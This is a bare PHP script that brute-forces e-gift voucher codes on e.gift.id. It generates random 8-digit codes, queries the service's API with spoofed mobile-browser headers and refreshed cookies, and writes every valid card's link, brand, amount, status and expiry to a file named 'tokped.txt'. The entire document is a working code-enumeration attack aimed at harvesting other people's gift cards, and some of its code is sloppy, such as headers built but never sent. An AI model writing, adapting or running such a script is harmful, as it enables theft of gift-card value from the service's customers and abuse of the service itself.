<?php
error_reporting(0);
$o=-1;
$arr = array("/","-","\\");
function rStr($l){
	$data = "1234567890";
	$word = "";
	for($a=0;$a<$l;$a++){
		$word .= $data{rand(0,strlen($data)-1)};
	}
	return $word;
}
function curl($url,$use=false){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
	if($use) curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$x = curl_exec($ch);
	curl_close($ch);
	return $x;
}
function check(){
	$rand = rStr(8);
	$kode = "8346/$rand";
	$h = array();
	$h[] = "Host: e.gift.id";
	$h[] = "Connection: keep-alive";
	$h[] = "Accept: application/json, text/plain, */*";
	$h[] = "Origin: https://e.gift.id";
	$h[] = "Save-Data: on";
	$h[] = "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36";
	$h[] = "Content-Type: application/json;charset=UTF-8";
	$h[] = "Referer: https://e.gift.id/u/16281bqpoj662";
	$h[] = "Accept-Language: en-US,en;q=0.9,id;q=0.8";
	$x = curl("https://e.gift.id/api/egifts/detail/".$kode);
	return json_encode(array("https://e.gift.id/s/$kode",$x));
}
while($a<true){
	$c = json_decode(check(), true);
	if($c[1]=="Unauthorized" OR $c[1]=="Bad Request"){
		echo "\nAuth Die\n";
		break;
	}
	if(stripos($c[1],"banned")){
		echo "IP Banned\n";
		continue;
	}
	$ccd = "https://e.gift.id/u/".@json_decode($c[1],true)['body']['code'];
    	$status = @json_decode($c[1], true)['body']['status'];
    	$exp = explode("T",@json_decode($c[1], true)['body']['expiredAt'])[0];
	$amount = @json_decode($c[1],true)['body']['amount'];
    	$brand = @json_decode($c[1],true)['body']['merchant']['brand'];
    	if(!empty($brand)){
        	$asww = $ccd." [$brand:$amount:$status:$exp]\n";
		echo $asww;
		$h=fopen("tokped.txt","a+");
		fwrite($h,$asww);
		fclose($h);
    	}else
    	if(@json_decode($c[1],true)['body']['title']=="EgiftNotFound"){
    	}else{
		echo "Renew Cookie!\n";
		$cookie = curl("https://e.gift.id/u/837qsoynaz546?fbclid=asdasdasd",true);
    	}
	echo "Checking ";
	$o+=1;
	if($o>2) $o=0;
	echo "[{$arr[$o]}] {$c[0]}\r";
}
